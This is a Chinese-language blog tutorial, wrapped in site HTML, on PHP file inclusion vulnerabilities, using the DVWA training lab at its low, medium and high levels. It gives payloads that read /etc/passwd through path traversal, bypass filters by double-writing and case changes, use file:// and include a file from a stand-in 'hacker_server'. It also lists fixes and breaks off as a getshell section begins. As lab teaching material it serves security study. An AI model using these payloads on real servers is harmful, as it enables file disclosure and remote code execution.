@@ -1,0 +1,1404 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Web应用好像包含了什么奇怪的东西= ='><title>Web安全:文件包含漏洞</title>
+
+<link rel='canonical' href='https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/'>
+
+<link rel="stylesheet" href="/scss/style.min.ac77dcf8b111b51da39a92990f431923f210f3876d85798a2125667f96dc33a4.css"><meta property='og:title' content='Web安全:文件包含漏洞'>
+<meta property='og:description' content='Web应用好像包含了什么奇怪的东西= ='>
+<meta property='og:url' content='https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/'>
+<meta property='og:site_name' content='猫猫の博客'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Web Sec' /><meta property='article:published_time' content='2022-09-13T20:07:24&#43;08:00'/><meta property='article:modified_time' content='2022-09-13T20:07:24&#43;08:00'/><meta property='og:image' content='https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover.jpg' />
+<meta name="twitter:title" content="Web安全:文件包含漏洞">
+<meta name="twitter:description" content="Web应用好像包含了什么奇怪的东西= ="><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://kira-pgr.github.io/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu6303347a79895c67737217ae3756b054_237429_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">猫猫の博客</a></h1>
+            <h2 class="site-description">DEV OPS SEC</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Kira-Pgr'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">
+                <img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover_hub6d28757c33c1ef5c0f635b7b627146b_864309_800x0_resize_q75_box.jpg"
+                        srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover_hub6d28757c33c1ef5c0f635b7b627146b_864309_800x0_resize_q75_box.jpg 800w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/cover_hub6d28757c33c1ef5c0f635b7b627146b_864309_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="312" 
+                        loading="lazy"
+                        alt="Featured image of post Web安全:文件包含漏洞" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/security/" >
+                Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">Web安全:文件包含漏洞</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Web应用好像包含了什么奇怪的东西= =
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 13, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    3 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="web安全文件包含漏洞">Web安全:文件包含漏洞</h1>
+<h2 id="漏洞原理">漏洞原理</h2>
+<p>开发者在代码中调用了<strong>外部文件</strong>，且调用的文件名受<strong>用户输入</strong>的影响，</p>
+<p>在<strong>权限控制不严谨</strong>的情况下会产生文件包含漏洞(File Inclusion)</p>
+<h2 id="分类">分类</h2>
+<p>文件包含漏洞分为本地文件包含漏洞和远程文件包含漏洞</p>
+<h3 id="远程文件包含rfiremote-file-inclusion">远程文件包含（RFI，Remote File Inclusion）</h3>
+<p>在文件包含漏洞的利用过程中，Web 应用程序下载并调用了远程文件，称作远程文件包含</p>
+<p>这些远程文件通常以 HTTP 或 FTP URI 的形式获取</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">target.xxx?file=http://hacker_server/evil.php
+</span></span></code></pre></div><h4 id="额外要求">额外要求</h4>
+<p>要产生远程文件包含漏洞，在使用了特定函数和权限控制不严谨外，<code>include</code>,<code>require</code>等包含函数还必须可以加载远程文件</p>
+<p>PHP的配置文件<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为<code>ON</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ini" data-lang="ini"><span class="line"><span class="ln">1</span><span class="cl"><span class="na">allow_url_fopen</span> <span class="o">=</span> <span class="s">On</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="na">//（是否允许打开远程文件）</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="na">allow_url_include</span> <span class="o">=</span> <span class="s">On</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="na">//（是否允许include/require远程文件）</span>
+</span></span></code></pre></div><h3 id="本地文件包含lfilocal-file-inclusion">本地文件包含（LFI，Local File Inclusion）</h3>
+<p>在文件包含漏洞的利用过程中，Web应用程序调用了本地(服务器上)的文件，称作本地文件包含</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">target.xxx?file=/etc/hosts
+</span></span></code></pre></div><h2 id="危害">危害</h2>
+<ul>
+<li>
+<p>Web服务器的文件被外界浏览而导致信息泄漏</p>
+</li>
+<li>
+<p>作为进一步攻击的垫脚石 (和其他漏洞同时使用造成严重危害)</p>
+</li>
+<li>
+<p>小概率会导致命令执行</p>
+</li>
+</ul>
+<h2 id="dvwa靶场实战">DVWA靶场实战</h2>
+<p>打开DVWA文件包含页面(<code>File Inclusion</code>)</p>
+<p>我们发现，当我们点击<code>file1.php</code>时，对应的URL的<code>page</code>的值变为<code>file1.php</code>，同时Web应用执行<code>file1.php</code>文件的源代码；</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://dvwa_ip/vulnerabilities/fi/?page=file1.php
+</span></span></code></pre></div><p>当我们点击<code>file2.php</code>时，对应的URL的<code>page</code>的值变为<code>file2.php</code>，同时Web应用执行<code>file2.php</code>文件的源代码；</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://dvwa_ip/vulnerabilities/fi/?page=file2.php
+</span></span></code></pre></div><p>当我们点击<code>file3.php</code>时，对应的URL的<code>page</code>的值变为<code>file3.php</code>，同时Web应用执行<code>file3.php</code>文件的源代码。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://dvwa_ip/vulnerabilities/fi/?page=file3.php
+</span></span></code></pre></div><p>由此可知，当我们在目标URL的<code>page</code>值后添加某个存在的文件名时，Web应用程序会相应的包含此文件。并且会将该文件(<strong>无论后缀名</strong>)作为<strong>PHP</strong>代码执行.</p>
+<h3 id="low">low</h3>
+<p>看一下源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="c1">// The page we wish to display
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;page&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="c1">// 通过get请求把page参数的值传入file变量
+</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><p>Web应用程序定义了一个变量<code>page</code>，将用户输入的值作为<code>page</code>变量的值，同时将其赋值给<code>file</code>变量。最后，Web应用程序通过对<code>file</code>变量的引用来实现文件的包含功能。</p>
+<p>DVWA的low级别一般是不带有任何防护的, 没有对输入的<code>page</code>变量的值执行任何过滤措施，如果我们输入那些系统不希望用户看见任何信息的文件的文件名，并赋值给<code>page</code>变量。那么Web应用程序就会产生文件包含漏洞，系统的敏感信息就会被泄露。</p>
+<h4 id="payload1本地--利用相对路径许多个就一定会来到根目录">payload1:本地&ndash;利用相对路径(许多个<code>../</code>就一定会来到根目录)</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">../../../../../../../../../../../../../../../../etc/passwd
+</span></span></code></pre></div><h4 id="payload2本地--利用绝对路径">payload2:本地&ndash;利用绝对路径</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">/etc/passwd
+</span></span></code></pre></div><h4 id="payload3远程包含">payload3:远程包含</h4>
+<p>由于DWVA的环境，Web应用可以包含远程文件</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">http://server/file
+</span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10.png"
+	width="1178"
+	height="212"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10_hu713ba8293390ba2624344f75ad4f00d0_45935_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_21-10_hu713ba8293390ba2624344f75ad4f00d0_45935_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="包含了猫猫的文件，就要付出代价 :&gt;"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="555"
+		data-flex-basis="1333px"
+	
+></p>
+<h3 id="medium">medium</h3>
+<p>直接上源码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1">// The page we wish to display
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;page&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1">// 依旧是通过get请求把page参数的值传入file变量
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1">// Input validation
+</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;http://&#34;</span><span class="p">,</span> <span class="s2">&#34;https://&#34;</span> <span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1">//将file变量中的http://和https://替换为空
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span> <span class="k">array</span><span class="p">(</span> <span class="s2">&#34;../&#34;</span><span class="p">,</span> <span class="s2">&#34;..</span><span class="se">\\</span><span class="s2">&#34;</span> <span class="p">),</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">);</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1">//同理，将file变量中的../和..\\替换为空
+</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="c1">//但是捏，它只替换了一次且只替换全小写的内容，也就意味着可以通过双写或大小写绕过
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><h4 id="payload1本地--绝对路径">payload1:本地&ndash;绝对路径</h4>
+<blockquote>
+<p>如果我们不使用<code>../</code>与<code>..\</code>这两个关键词，而是直接访问根目录下的用户信息文件<code>/etc/passwd</code> 。</p>
+<p>由于Web应用程序的过滤很不严谨，并没有对根目录<code>/</code>执行过滤，所以系统不能过滤我们输入的payload，那么Web应用程序将成功包含文件<code>/etc/passwd</code>，并直接暴露其源代码。
+即我们构造的payload成功的绕过了Web应用程序的防御机制。</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">/etc/passwd
+</span></span></code></pre></div><h4 id="payload2远程--双写绕过">payload2:远程&ndash;双写绕过</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">hthttp://tp://server/file
+</span></span></code></pre></div><h4 id="payload3远程--大小写绕过">payload3:远程&ndash;大小写绕过</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">hTtp://server/file
+</span></span></code></pre></div><h4 id="payload4远程本地皆可--使用httphttps外的协议">payload4:远程本地皆可&ndash;使用http/https外的协议</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">file:///etc/passwd
+</span></span></code></pre></div><h3 id="high">high</h3>
+<p>看源码= =</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="c1">// The page we wish to display
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1">// 日常通过get请求把page参数的值传入file变量
+</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="c1"></span><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;page&#39;</span> <span class="p">];</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1">// Input validation
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1">//如果file变量的开头不是file且file的值不为include.php
+</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1">//就提示找不到文件并退出程序
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="nx">fnmatch</span><span class="p">(</span> <span class="s2">&#34;file*&#34;</span><span class="p">,</span> <span class="nv">$file</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$file</span> <span class="o">!=</span> <span class="s2">&#34;include.php&#34;</span> <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="c1">// This isn&#39;t the page we want!
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="c1"></span>    <span class="k">echo</span> <span class="s2">&#34;ERROR: File not found!&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="k">exit</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl">
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="cp">?&gt;</span><span class="err"> 
+</span></span></span></code></pre></div><blockquote>
+<p>补充一个知识点:</p>
+<p><code>fnmatch()</code> 函数的作用是根据指定的模式来匹配文件名或字符串。
+语法为：<code>fnmatch(pattern,string,flags)</code> 各个参数解释如下：</p>
+<ul>
+<li>
+<p><code>pattern</code> 必需。规定要检索的模式。</p>
+</li>
+<li>
+<p><code>string</code> 必需。规定要检查的字符串或文件。</p>
+</li>
+<li>
+<p><code>flags</code> 可选. 它是可选的参数表，用于指定标志或标志的组合.</p>
+<p>这些标志可以是以下标志的组合：</p>
+<ul>
+<li>
+<p><code>FNM_PATHNAME</code>：用于指定字符串中的斜线仅匹配给定模式中的斜线。</p>
+</li>
+<li>
+<p><code>FNM_NOESCAPE</code>：用于禁用反斜杠转义。</p>
+</li>
+<li>
+<p><code>FNM_CASEFOLD</code>：用于无 shell 匹配。</p>
+</li>
+<li>
+<p><code>FNM_PERIOD</code>：用于指定字符串中的前导期间必须与给定模式中的期间完全匹配。</p>
+</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p><code>high</code>模式中进行了更为安全的白名单过滤,因此现在包含的东西必须要以file开头了</p>
+<h4 id="payload1file协议正合我意">payload1:file协议正合我意</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">file:///etc/passwd
+</span></span></code></pre></div><hr>
+<h4 id="补充-php中文件包含函数">补充: PHP中文件包含函数</h4>
+<p>PHP中文件包含函数有以下四种</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="k">require</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="k">require_once</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="k">include</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="k">include_once</span><span class="p">()</span>
+</span></span></code></pre></div><p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
+<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，从而确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
+<p>测试代码</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">    <span class="c1">//可以将include换成其他函数测试
+</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="c1"></span>    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><img src="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48.png"
+	width="1148"
+	height="216"
+	srcset="/p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48_hu3bbb01bb25e975d50471ae10ec79c80f_41436_480x0_resize_box_3.png 480w, /p/web%E5%AE%89%E5%85%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/2022-09-10_23-48_hu3bbb01bb25e975d50471ae10ec79c80f_41436_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="演示"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="531"
+		data-flex-basis="1275px"
+	
+></p>
+<hr>
+<h4 id="payload2利用php可以包含多个文件的feature">payload2:利用PHP可以包含多个文件的feature</h4>
+<p>由上文可推断出，如果程序员在包含的时候用的<code>include</code>，前面那个<code>file</code>开头的文件存不存在都无所谓</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">file[任何内容]../../../../../../../../../../../../../../../../etc/passwd
+</span></span></code></pre></div><p>如果程序员在包含的时候用的<code>require</code>话，前面那个<code>file</code>开头的文件就<strong>必须存在!</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">file[补全一个存在的文件名]../../../../../../../../../../../../../../../../etc/passwd
+</span></span></code></pre></div><h2 id="修复">修复</h2>
+<p>修复建议</p>
+<ul>
+<li>
+<p>严格检查变量是否已经初始化。</p>
+</li>
+<li>
+<p>对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和../等目录跳转符。</p>
+</li>
+<li>
+<p>严格检查文件包含函数中的参数是否外界可控。</p>
+</li>
+</ul>
+<h2 id="getshellsession与文件包含漏洞的结合">Getshell:session与文件包含漏洞的结合</h2>
+<h3 id="条件">条件</h3>
+<ul>
+<li>
+<p>session的存储位置可以获取(phpinfo页面一般可以获取)</p>
+</li>
+<li>
